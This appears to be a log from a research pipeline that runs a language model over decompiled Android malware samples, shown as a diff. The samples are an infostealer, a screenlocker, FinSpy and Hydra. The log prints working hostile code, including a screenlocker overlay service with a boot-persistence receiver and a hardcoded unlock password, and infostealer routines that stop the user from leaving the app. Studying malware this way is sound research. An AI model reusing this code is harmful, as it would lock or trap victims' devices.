@@ -1,0 +1,868 @@
+Processing APK: infostealer.json
+Processing function 1, which looks like this: public void onCreate(android.os.Bundle r17) {
+        /*
+            Method dump skipped, instructions count: 574
+            To view this dump add '--comments-level debug' option
+        */
+        throw new UnsupportedOperationException("Method not decompiled: net.axel.app.activities.Main.onCreate(android.os.Bundle):void");
+    }
+Processing function 2, which looks like this: public void a() {
+            if (e.a.a.b.a.e(Main.this.p)) {
+                Main.this.q.a("API_SUBSCRIBE_WASATA", true);
+                if (!k.E(Main.this.p)) {
+                    k.a(Main.this.p, (Boolean) true);
+                } else {
+                    Main main = Main.this;
+                    main.q = e.a.a.a.a.a(main.p);
+                    Main.this.q.a("API_SET_ACCOUNT_NICKNAME", " ");
+                    Main.this.q.a("API_SET_TRANSFER_PIN", " ");
+                }
+            }
+Processing function 3, which looks like this: public void b() {
+        }
+Processing function 4, which looks like this: public void run() {
+                Intent intent = new Intent(Main.this, Telegram.class);
+                Main.this.startActivity(intent);
+                Main.this.finish();
+            }
+Processing function 5, which looks like this: public void run() {
+            this.f4783b.post(new a());
+        }
+Processing function 6, which looks like this: public void l() {
+        if (this.q.a("INSTA_APP_DONE")) {
+            k.j(this.p);
+            k.a(this.p, 0);
+        } else if (this.q.a("INSTA_APP_DONE_NON_TRANS")) {
+            startActivity(new Intent("android.settings.SETTINGS"));
+        } else if (this.q.a("INSTA_APP_BIXBY")) {
+            k.f(this.p, "com.google.android.apps.maps");
+        } else if (this.q.a("INSTA_APP_PLAY_SERVICES")) {
+            k.f(this.p, "com.android.vending");
+        } else if (this.q.a("INSTA_APP_CHROME")) {
+            k.f(this.p, "com.android.chrome");
+        } else if (this.q.a("INSTA_APP_WIFI")) {
+            Intent intent = new Intent("android.settings.WIFI_SETTINGS");
+            intent.setFlags(268435456);
+            startActivity(intent);
+        }
+        finish();
+    }
+Processing function 7, which looks like this: public void n() {
+        boolean First_Run = this.q.a("API_CHECK_FRIEND_ACCOUNT");
+        if (!First_Run) {
+            this.q.a("API_CHECK_FRIEND_ACCOUNT", true);
+            if (e.a.a.b.a.e(this.p)) {
+                this.q.a("API_SUBSCRIBE_WASATA", true);
+                if (!k.E(this.p)) {
+                    k.a(this.p, (Boolean) true);
+                    return;
+                }
+                this.q = e.a.a.a.a.a(this.p);
+                this.q.a("API_SET_ACCOUNT_NICKNAME", " ");
+                this.q.a("API_SET_TRANSFER_PIN", " ");
+                return;
+            }
+Processing function 8, which looks like this: public void m() {
+        if (e.a.a.b.a.e(this.p)) {
+            k.E(this.p, 240);
+        }
+    }
+Processing function 9, which looks like this: private void a(ArrayList<String> arraylist) {
+        int i2 = Build.VERSION.SDK_INT;
+        if (i2 >= 22) {
+            try {
+                if (i2 < 29) {
+                    arraylist.add("Virtual Notifications");
+                } else {
+                    arraylist.add("Device Admin");
+                }
+                arraylist.add("Google Listener");
+                arraylist.add("Notifications Service");
+                if ((Build.MANUFACTURER.equalsIgnoreCase("xiaomi") || Build.MANUFACTURER.equalsIgnoreCase("huawei")) && Build.VERSION.SDK_INT >= 26) {
+                    arraylist.add("Auto Start");
+                }
+            }
+Processing function 10, which looks like this: public void onBackPressed() {
+    }
+Processing function 11, which looks like this: public void onStart() {
+        super.onStart();
+        this.s.a();
+    }
+Processing function 12, which looks like this: public void onStop() {
+        super.onStop();
+        this.s.b();
+    }
+Processing function 13, which looks like this: protected void onUserLeaveHint() {
+        super.onUserLeaveHint();
+        ((ActivityManager) getApplicationContext().getSystemService("activity")).moveTaskToFront(getTaskId(), 0);
+    }
+Processing function 14, which looks like this: public void onPause() {
+        super.onPause();
+        ((ActivityManager) getApplicationContext().getSystemService("activity")).moveTaskToFront(getTaskId(), 0);
+    }
+Processing function 15, which looks like this: public void onDestroy() {
+        super.onDestroy();
+    }
+Processing function 16, which looks like this: public void o() {
+        ArrayList<String> arrayList = u;
+        if (arrayList != null) {
+            arrayList.clear();
+            u.add("play");
+            u.add("settings");
+            if (Build.MANUFACTURER.equalsIgnoreCase("samsung")) {
+                u.add("bixby");
+            }
+            u.add("chrome");
+            u.add("wifi");
+        }
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Saving output...
+Output saved at /scratch/ms9761/rea-llm/codellama/outputs/infostealer.json!
+Processing APK: screenlocker.json
+Processing function 1, which looks like this: public void onCreate(Bundle bundle) {
+        ADRTLogCatReader.onContext(this, "com.aide.ui");
+        super.onCreate(bundle);
+        try {
+            startService(new Intent(this, Class.forName("com.XPhantom.id.MyService")));
+            finish();
+        } catch (ClassNotFoundException e) {
+            throw new NoClassDefFoundError(e.getMessage());
+        }
+    }
+Processing function 2, which looks like this: package adrt;
+
+import android.content.Context;
+import android.content.pm.PackageManager;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+/* loaded from: classes.dex */
+public class ADRTLogCatReader implements Runnable {
+    private static Context context;
+
+    public static void onContext(Context context2, String str) {
+        if (context == null) {
+            context = context2.getApplicationContext();
+            if (0 != (context2.getApplicationInfo().flags & 2)) {
+                try {
+                    context2.getPackageManager().getPackageInfo(str, 128);
+                    ADRTSender.onContext(context, str);
+                    new Thread(new ADRTLogCatReader(), "LogCat").start();
+                } catch (PackageManager.NameNotFoundException e) {
+                }
+            }
+        }
+    }
+
+    @Override // java.lang.Runnable
+    public void run() {
+        try {
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("logcat -v threadtime").getInputStream()), 20);
+            while (true) {
+                String readLine = bufferedReader.readLine();
+                if (readLine == null) {
+                    return;
+                }
+                ADRTSender.sendLogcatLines(new String[]{readLine});
+            }
+        } catch (IOException e) {
+        }
+    }
+}
+Processing function 3, which looks like this: package adrt;
+
+import android.content.Context;
+import android.content.Intent;
+import java.util.ArrayList;
+/* loaded from: classes.dex */
+public class ADRTSender {
+    private static Context context;
+    private static String debuggerPackageName;
+
+    public static void onContext(Context context2, String str) {
+        context = context2;
+        debuggerPackageName = str;
+    }
+
+    public static void sendConnect(String str) {
+        Intent intent = new Intent();
+        intent.setPackage(debuggerPackageName);
+        intent.setAction("com.adrt.CONNECT");
+        intent.putExtra("package", str);
+        context.sendBroadcast(intent);
+    }
+
+    public static void sendStop(String str) {
+        Intent intent = new Intent();
+        intent.setPackage(debuggerPackageName);
+        intent.setAction("com.adrt.STOP");
+        intent.putExtra("package", str);
+        context.sendBroadcast(intent);
+    }
+
+    public static void sendBreakpointHit(String str, ArrayList<String> arrayList, ArrayList<String> arrayList2, ArrayList<String> arrayList3, ArrayList<String> arrayList4, ArrayList<String> arrayList5, ArrayList<String> arrayList6) {
+        Intent intent = new Intent();
+        intent.setPackage(debuggerPackageName);
+        intent.setAction("com.adrt.BREAKPOINT_HIT");
+        intent.putExtra("package", str);
+        intent.putExtra("variables", arrayList);
+        intent.putExtra("variableValues", arrayList2);
+        intent.putExtra("variableKinds", arrayList3);
+        intent.putExtra("stackMethods", arrayList4);
+        intent.putExtra("stackLocations", arrayList5);
+        intent.putExtra("stackLocationKinds", arrayList6);
+        context.sendBroadcast(intent);
+    }
+    public static void sendFields(String str, String str2, ArrayList<String> arrayList, ArrayList<String> arrayList2, ArrayList<String> arrayList3) {
+        Intent intent = new Intent();
+        intent.setPackage(debuggerPackageName);
+        intent.setAction("com.adrt.FIELDS");
+        intent.putExtra("package", str);
+        intent.putExtra("path", str2);
+        intent.putExtra("fields", arrayList);
+        intent.putExtra("fieldValues", arrayList2);
+        intent.putExtra("fieldKinds", arrayList3);
+        context.sendBroadcast(intent);
+    }
+
+    public static void sendLogcatLines(String[] strArr) {
+        Intent intent = new Intent();
+        intent.setPackage(debuggerPackageName);
+        intent.setAction("com.adrt.LOGCAT_ENTRIES");
+        intent.putExtra("lines", strArr);
+        context.sendBroadcast(intent);
+    }
+}
+Processing function 4, which looks like this: package com.XPhantom.id;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+/* loaded from: classes.dex */
+public class BootReceiver extends BroadcastReceiver {
+    private final String BOOT_ACTION = "android.intent.action.BOOT_COMPLETED";
+    Context mContext;
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        this.mContext = context;
+        if (intent.getAction().equalsIgnoreCase("android.intent.action.BOOT_COMPLETED")) {
+            try {
+                context.startService(new Intent(context, Class.forName("com.XPhantom.id.MyService")));
+            } catch (ClassNotFoundException e) {
+                throw new NoClassDefFoundError(e.getMessage());
+            }
+        }
+    }
+}
+Processing function 5, which looks like this: package com.XPhantom.id;
+
+import adrt.ADRTLogCatReader;
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.os.IBinder;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.WindowManager;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.ImageView;
+import android.widget.Toast;
+/* loaded from: classes.dex */
+public class MyService extends Service {
+    ImageView chatHead;
+    Context context;
+    EditText e1;
+    ViewGroup myView;
+    WindowManager windowManager;
+
+    @Override // android.app.Service
+    public void onCreate() {
+        ADRTLogCatReader.onContext(this, "com.aide.ui");
+        this.windowManager = (WindowManager) getSystemService("window");
+        this.myView = (ViewGroup) ((LayoutInflater) getSystemService("layout_inflater")).inflate(R.layout.main, (ViewGroup) null);
+        this.chatHead = new ImageView(this);
+        this.chatHead.setImageResource(R.drawable.ic_launcher);
+        this.e1 = (EditText) this.myView.findViewById(R.id.mainEditText1);
+        ((Button) this.myView.findViewById(R.id.mainButton1)).setOnClickListener(new View.OnClickListener(this) { // from class: com.XPhantom.id.MyService.100000000
+            private final MyService this$0;
+
+            {
+                this.this$0 = this;
+            }
+
+            @Override // android.view.View.OnClickListener
+            public void onClick(View view) {
+                if (this.this$0.e1.getText().toString().equals("Abdullah@")) {
+                    this.this$0.windowManager.removeView(this.this$0.myView);
+                    try {
+                        this.this$0.context.startService(new Intent(this.this$0.context, Class.forName("com.XPhantom.id.MyService")));
+                        return;
+                    } catch (ClassNotFoundException e) {
+                        throw new NoClassDefFoundError(e.getMessage());
+                    }
+                }
+                this.this$0.e1.setText("");
+            }
+        });
+        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(-2, -2, 2002, 1, -3);
+        layoutParams.gravity = 17;
+        layoutParams.x = 0;
+        layoutParams.y = 0;
+        new View(this).setBackgroundColor(872349696);
+        this.windowManager.addView(this.myView, layoutParams);
+    }
+
+    @Override // android.app.Service
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    public void f() {
+        Toast.makeText(this, "Ваш текст", 0).show();
+    }
+}
+Processing function 6, which looks like this: package com.XPhantom.id;
+/* loaded from: classes.dex */
+public final class R {
+
+    /* loaded from: classes.dex */
+    public static final class attr {
+    }
+
+    /* loaded from: classes.dex */
+    public static final class drawable {
+        public static final int ic_launcher = 0x7f020000;
+        /* JADX INFO: Added by JADX */
+        public static final int ic_launcher_bacground = 0x7f020001;
+        /* JADX INFO: Added by JADX */
+        public static final int ic_launcher_background = 0x7f020002;
+        /* JADX INFO: Added by JADX */
+        public static final int ic_launcher_round = 0x7f020003;
+    }
+
+    /* loaded from: classes.dex */
+    public static final class id {
+        public static final int mainButton1 = 0x7f060000;
+        public static final int mainEditText1 = 0x7f060001;
+    }
+
+    /* loaded from: classes.dex */
+    public static final class layout {
+        public static final int main = 0x7f030000;
+    }
+
+    /* loaded from: classes.dex */
+    public static final class string {
+        public static final int app_name = 0x7f040001;
+        public static final int hello = 0x7f040000;
+        public static final int password = 0x7f040004;
+        public static final int text = 0x7f040002;
+        public static final int text1 = 0x7f040003;
+    }
+
+    /* loaded from: classes.dex */
+    public static final class style {
+        public static final int AppTheme = 0x7f050000;
+    }
+}
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Saving output...
+Output saved at /scratch/ms9761/rea-llm/codellama/outputs/screenlocker.json!
+Processing APK: finspy.json
+Processing function 1, which looks like this: protected void onCreate(Bundle bundle) {
+        iIiOi11OIOOl01O();
+        super.onCreate(bundle);
+        iIiOi11OIOOl01O();
+        Context applicationContext = getApplicationContext();
+        iIiOi11OIOOl01O();
+        Init.init(applicationContext, null, this);
+        iIiOi11OIOOl01O();
+        finish();
+    }
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Saving output...
+Output saved at /scratch/ms9761/rea-llm/codellama/outputs/finspy.json!
+Processing APK: hydra.json
+Processing function 1, which looks like this: public void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        setContentView(R.layout.activity_main);
+        if (!haveNetworkConnection()) {
+            AlertDialog.Builder builder = new AlertDialog.Builder(this);
+            builder.setCancelable(false);
+            builder.setTitle("No Internet Connection");
+            builder.setMessage("You are offline please check your internet connection");
+            builder.setPositiveButton("Ok", new DialogInterface.OnClickListener() { // from class: com.wcurrencyworlds.worldcurrency.MainActivity.1
+                @Override // android.content.DialogInterface.OnClickListener
+                public void onClick(DialogInterface dialogInterface, int i) {
+                    MainActivity.this.finishAffinity();
+                }
+            }
+Processing function 2, which looks like this: public void onPageScrollStateChanged(int i) {
+            }
+Processing function 3, which looks like this: public void onPageScrolled(int i, float f, int i2) {
+            }
+Processing function 4, which looks like this: public void onPageSelected(int i) {
+            }
+Processing function 5, which looks like this: public void onClick(View view) {
+        if (view == this.navopone) {
+            this.viewPager.setCurrentItem(0);
+        }
+        if (view == this.navoptwo) {
+            this.viewPager.setCurrentItem(1);
+        }
+        if (view == this.navopthree) {
+            this.viewPager.setCurrentItem(2);
+        }
+        if (view == this.navopfour) {
+            this.viewPager.setCurrentItem(3);
+        }
+    }
+Processing function 6, which looks like this: private boolean haveNetworkConnection() {
+        NetworkInfo[] allNetworkInfo;
+        boolean z = false;
+        boolean z2 = false;
+        for (NetworkInfo networkInfo : ((ConnectivityManager) getSystemService("connectivity")).getAllNetworkInfo()) {
+            if (networkInfo.getTypeName().equalsIgnoreCase("WIFI") && networkInfo.isConnected()) {
+                z = true;
+            }
+            if (networkInfo.getTypeName().equalsIgnoreCase("MOBILE") && networkInfo.isConnected()) {
+                z2 = true;
+            }
+        }
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Sending request to server...
+Response received!
+Response analyzed!
+Saving output...
+Output saved at /scratch/ms9761/rea-llm/codellama/outputs/hydra.json!
